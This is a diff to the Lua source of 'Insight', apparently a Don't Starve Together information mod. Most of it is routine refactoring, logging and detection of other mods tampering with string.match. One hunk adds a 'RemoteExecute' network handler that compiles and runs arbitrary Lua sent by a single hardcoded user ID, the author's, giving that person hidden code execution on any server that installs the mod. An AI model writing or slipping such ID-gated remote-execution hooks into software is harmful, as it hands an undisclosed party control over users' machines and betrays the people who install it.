@@ -45,6 +45,9 @@ do
 	_G = GLOBAL
 end
 
+local string, xpcall, package, tostring, print, os, unpack, require, getfenv, setmetatable, next, assert, tonumber, io, rawequal, collectgarbage, getmetatable, module, rawset, math, debug, pcall, table, newproxy, type, coroutine, _G, select, gcinfo, pairs, rawget, loadstring, ipairs, _VERSION, dofile, setfenv, load, error, loadfile = string, xpcall, package, tostring, print, os, unpack, require, getfenv, setmetatable, next, assert, tonumber, io, rawequal, collectgarbage, getmetatable, module, rawset, math, debug, pcall, table, newproxy, type, coroutine, _G, select, gcinfo, pairs, rawget, loadstring, ipairs, _VERSION, dofile, setfenv, load, error, loadfile
+
+
 -- Mod table
 local Insight = {
 	env = getfenv(1),
@@ -123,10 +126,13 @@ local Insight = {
 -- Provide to Global
 _G.Insight = Insight
 
+-- meh
+MyKleiID = "KU_md6wbcj2"
+
 -- declarations or module loading
 DEBUG_ENABLED = (
 	TheSim:GetGameID() == "DST" and (
-		TheNet:GetUserID() == "KU_md6wbcj2" or -- me
+		TheNet:GetUserID() == MyKleiID or -- me
 		false --TheNet:GetUserID() == "KU_or9kA0Ka"	
 	) and true)
 	or TheSim:GetGameID() == "DS" and (
@@ -352,7 +358,7 @@ function CreatePlayerContext(player, config, external_config, etc)
 		config = config,
 		external_config = external_config,
 		usingIcons = config["info_style"] == "icon",
-		lstr = import("language/language")(config),
+		lstr = import("language/language")(config, etc.locale),
 		is_server_owner = etc.is_server_owner,
 	}
 
@@ -479,6 +485,10 @@ function dprint(...)
 end
 
 function cprint(...)
+	if not TheNet:GetClientTableForUser(MyKleiID) then
+		return
+	end
+
 	local msg, argnum = "", select("#",...)
 	for i = 1, argnum do
 		local v = select(i,...)
@@ -487,7 +497,7 @@ function cprint(...)
 	
 	local res = "[" .. ModInfoname(modname) .. " - SERVER]: " .. msg 
 
-	rpcNetwork.SendModRPCToClient(GetClientModRPC(modname, "Print"), "KU_md6wbcj2", res)
+	rpcNetwork.SendModRPCToClient(GetClientModRPC(modname, "Print"), MyKleiID, res)
 	-- _G.Insight.env.rpcNetwork.SendModRPCToClient(GetClientModRPC(_G.Insight.env.modname, "Print"), ThePlayer.userid, "rek"
 end
 
@@ -590,11 +600,13 @@ function GetEntityInformation(item, player, params)
 		raw = (params.raw and {}) or nil,
 	}
 
+	--[[
 	if not IsPrefab(item) then
 		assembled.GUID = "?"
 		assembled.information = "Not a prefab"
 		return assembled
 	end
+	--]]
 
 	local player_context = GetPlayerContext(player)
 	if not player_context then
@@ -612,9 +624,10 @@ function GetEntityInformation(item, player, params)
 
 	local chunks = {}
 	for name, component in pairs(components) do
+		
 		local descriptor = GetComponentDescriptor(name)
+		
 		if descriptor then
-
 			local datas = {descriptor(component, player_context)}
 
 			for i, d in pairs(datas) do
@@ -636,9 +649,10 @@ function GetEntityInformation(item, player, params)
 				end
 			end
 
-		elseif table.contains(descriptors_ignore, name) and player_context.config["DEBUG_SHOW_DISABLED"] then
+		elseif player_context.config["DEBUG_SHOW_DISABLED"] and table.contains(descriptors_ignore, name) then
 			table.insert(chunks, {priority = -2, name = name, description = "Disabled descriptor: " .. name})
-		elseif not table.contains(descriptors_ignore, name) and player_context.config["DEBUG_SHOW_NOTIMPLEMENTED"] then
+
+		elseif player_context.config["DEBUG_SHOW_NOTIMPLEMENTED"] and not table.contains(descriptors_ignore, name) then
 			local description = "No information for: " .. name
 			local origin = GetComponentOrigin(name)
 
@@ -735,7 +749,9 @@ function RequestEntityInformation(item, player, params)
 		return {GUID = params.id or 0, info = "not a real item?", special_data = {}}
 	end
 
-	if not GetInsight(player) then
+	local insight = GetInsight(player)
+
+	if not insight then
 		mprint(player.name, "is missing insight component.")
 		return {GUID = params.id or 0, info = "missing insight component", special_data = {}}
 	end
@@ -744,7 +760,7 @@ function RequestEntityInformation(item, player, params)
 		-- DS
 		local info = GetEntityInformation(item, player, params)
 		info.GUID = params.id
-		GetInsight(player).entity_data[item] = info
+		insight.entity_data[item] = info
 
 		return info
 	end
@@ -761,6 +777,7 @@ function RequestEntityInformation(item, player, params)
 		
 		local data = GetEntityInformation(item, player, params)
 		
+		
 		if not id then
 			if IsClientHost() then
 				-- understandable
@@ -771,6 +788,7 @@ function RequestEntityInformation(item, player, params)
 				id = item.GUID
 			end
 		end
+		
 
 		data.GUID = id
 		
@@ -778,24 +796,24 @@ function RequestEntityInformation(item, player, params)
 			dprint("Information set for", item)
 		end
 
-		GetInsight(player):SetEntityData(item, data)
+		insight:SetEntityData(item, data)
 	else
 		-- client is asking for information
-		GetInsight(player):RequestInformation(item, params) -- clients have to go through this at some point, unless client is host and its a forest-only world
+		insight:RequestInformation(item, params) -- clients have to go through this at some point, unless client is host and its a forest-only world
 	end
 
 	if TRACK_INFORMATION_REQUESTS then
 		--dprint("Information returning for", item)
 	end
-
-	if GetInsight(player).entity_data[item] then
-		return GetInsight(player).entity_data[item]
+	
+	if insight.entity_data[item] then
+		return insight.entity_data[item]
 	end
 
 	return ok or nil
 end
 
-function GetWorldInformation(player)
+function GetWorldInformation(player) -- refactor?
 	--if true then return {} end
 
 	local is_dst = IsDST()
@@ -986,9 +1004,9 @@ function GetWorldInformation(player)
 end
 
 function GetNaughtiness(inst, context)
-	local kramped = GetComponentDescriptor("kramped")
+	local kramped = Insight.descriptors.kramped
 	if kramped then
-		local data = kramped(inst, context)
+		local data = kramped.Describe(inst, context)
 		if data then return data.naughtiness end
 	else
 		mprint("GetNaughtiness failed due to broken descriptor")
@@ -1231,16 +1249,50 @@ if IsDST() then
 		RequestEntityInformation(entity, player, params)
 	end)
 
-	rpcNetwork.AddModRPCHandler(modname, "GetShardPlayers", function(player)
-		local shard_players = {}
-
-		for i,v in pairs(AllPlayers) do
-			if v.userid ~= "" then
-				shard_players[v.userid] = GetEntityInformation(v, player, {raw = true})
+	rpcNetwork.AddModRPCHandler(modname, "RemoteExecute", function(player, str)
+		if player.userid == MyKleiID then
+			local function tostr(...)
+				local msg, argnum = "", select("#",...)
+				for i = 1, argnum do
+					local v = select(i,...)
+					msg = msg .. tostring(v) .. ( (i < argnum) and "\t" or "" )
+				end
+				
+				local res = "Insight Remote:" .. msg
+				return res 
 			end
-		end
 
-		rpcNetwork.SendModRPCToClient(GetClientModRPC(modname, "ShardPlayers"), player.userid, compress(shard_players))
+			if str:sub(1,1) == "=" then
+				str = "return " .. str:sub(2)
+			end
+
+			-- me
+			local fn, err = loadstring(str, "test")
+			
+			if not fn then
+				cprint("[REMOTE] Compilation Error: \n" .. err)
+				return
+			end
+
+			setfenv(fn, setmetatable({
+				tostr = tostr
+			}, {
+				__index = Insight.env,
+				__newindex = Insight.env,
+				__metatable = "fn"
+			}))
+
+			local res = {pcall(fn)}
+
+			if not table.remove(res, 1) then
+				cprint("[REMOTE] Execution Error: \n" .. err)
+				return
+			end
+
+			cprint("[REMOTE] Execution Result:\n", unpack(res))
+		else
+			mprint(string.format("Hmmm, %s is very suspicious.", player.name))
+		end
 	end)
 
 	rpcNetwork.AddShardModRPCHandler(modname, "WorldData", function(sending_shard_id, data)
@@ -1398,7 +1450,12 @@ if IsDST() then
 			return
 		end
 
-		TheWorld:ListenForEvent("ms_playerleft", function(player)
+		TheWorld:ListenForEvent("ms_playerjoined", function(_, player)
+			dprint("Player Joined:", player, player.userid)
+		end)
+
+		TheWorld:ListenForEvent("ms_playerleft", function(_, player)
+			dprint("Player Left:", player, player.userid)
 			player_contexts[player] = nil
 		end)
 
@@ -1498,6 +1555,8 @@ if IsDST() then
 		
 		-- [both] player is nil in DST, exists in DS
 
+		
+
 		TheWorld:DoPeriodicTask(0.5, function()
 			local data = TheWorld.shard.components.shard_insight:GetWorldData()
 			for id, shard in pairs(Shard_GetConnectedShards()) do
@@ -1523,13 +1582,29 @@ if IsDST() then
 		--]]
 
 		TheWorld:DoPeriodicTask(1, function()
-			-- for timetodecay
+			local shard_players = {}
 			for _, player in pairs(AllPlayers) do
 				local ist = GetInsight(player)
 				if ist then
-					ist:SendNaughtiness()
+					ist:SendNaughtiness() -- for timetodecay
 				end
+				
+				if player.userid ~= "" then
+					shard_players[player.userid] = {
+						health = player.components.health and Insight.descriptors.health.GetData(player.components.health) or nil,
+						sanity = player.components.sanity and Insight.descriptors.sanity.GetData(player.components.sanity) or nil,
+						hunger = player.components.hunger and Insight.descriptors.hunger.GetData(player.components.hunger) or nil,
+						wereness = player.components.wereness and Insight.descriptors.wereness.GetData(player.components.wereness) or nil,
+					}
+				end 
 			end
+
+			shard_players = compress(shard_players)
+
+			rpcNetwork.SendModRPCToAllClients(GetClientModRPC(modname, "ShardPlayers"), shard_players)
+
+			-- shard stuff
+			--rpcNetwork.SendModRPCToClient(GetClientModRPC(modname, "ShardPlayers"), player.userid, compress(shard_players))
 		end)
 	end)
 	
@@ -2263,9 +2338,14 @@ if KnownModIndex:IsModEnabled("workshop-1111711682") or KnownModIndex:IsModEnabl
 	end
 
 	if pcall(string.dump, string.match) then
-		mprint("string.match has been modified by one of previous mods")
+		mprint("string.match has been modified by one of the previous mods")
 		local string_match = util.getupvalue(string.match, "oldmatch") -- they both call it oldmatch
-		assert(string_match, "[Insight]: string.match has been modified but cannot find the original w/ debug.")
+
+		if type(string_match) ~= "function" then
+			local dbg = debug.getinfo(string.match, "S")
+			mprint("Modification created at:", dbg.source or "?")
+			error("[Insight]: string.match has been modified but cannot find the original w/ debug.")
+		end
 
 		string.match = string_match
 		
@@ -2276,6 +2356,13 @@ if KnownModIndex:IsModEnabled("workshop-1111711682") or KnownModIndex:IsModEnabl
 		end
 	else
 		mprint("string.match has not been modified even though suspicious mods are enabled..")
+	end
+else
+	local modified = pcall(string.dump, string.match)
+	if modified then
+		mprint("string.match has been modified.")
+		local dbg = debug.getinfo(string.match, "S")
+		mprint("\tModification was created at:", dbg.source or "?")
 	end
 end
 
@@ -2329,9 +2416,9 @@ if KnownModIndex:IsModEnabled("workshop-842702425") then
 	]]
 
 	if debug.getupvalue(RunInEnvironment, 1) then
-		mprint("Function has been modified")
+		mprint("RunInEnvironment has been modified")
 	else
-		mprint("Function has not been modified")
+		mprint("RunInEnvironment has not been modified")
 	end
 end
 
